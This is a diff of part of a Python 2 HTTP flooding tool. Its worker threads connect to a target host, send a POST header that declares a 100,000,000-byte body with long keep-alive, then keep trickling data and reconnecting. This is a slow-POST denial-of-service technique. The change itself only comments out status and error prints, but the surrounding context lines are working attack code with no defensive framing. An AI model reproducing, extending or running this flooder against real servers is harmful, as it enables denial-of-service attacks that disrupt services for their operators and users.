@@ -22,6 +22,8 @@ class HTTPWorkerThread(Process):
         else:
             self.message = self.flooder.message
 
+        print "initialized http thread"
+
     def stop(self):
         self.running = False
 
@@ -33,7 +35,7 @@ class HTTPWorkerThread(Process):
                           "Keep-Alive: 900\r\n"
                           "Content-Length: 100000000\r\n"
                           "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % (self.host))
-        print "thread", self.id, "send header"
+        #print "thread", self.id, "send header"
 
     def run(self):
         try:
@@ -41,12 +43,12 @@ class HTTPWorkerThread(Process):
                 while self.running:
                     try:
                         self.socket.connect((self.host, self.port))
-                        print "thread", self.id, "connected"
+                        #print "thread", self.id, "connected"
                         break
                     except Exception, e:
                         if e.args[0] == 106 or e.args[0] == 60:
                             break
-                        print "Couldn't connect:", e.args, self.host, self.port
+                        #print "Couldn't connect:", e.args, self.host, self.port
                         time.sleep(1)
                         continue
                     break
@@ -58,9 +60,9 @@ class HTTPWorkerThread(Process):
                         time.sleep(1)
                 except Exception, e:
                     if e.args[0] == 32 or e.args[0] == 104:
-                        print "thread", self.id ,"connection broken, retrying."
+                        #print "thread", self.id ,"connection broken, retrying."
                         self.socket = socket.socket()
-                    print "Couldn't send message on thread", self.id, "because", e.args
+                    #print "Couldn't send message on thread", self.id, "because", e.args
                     time.sleep(0.1)
                     pass
         except KeyboardInterrupt:
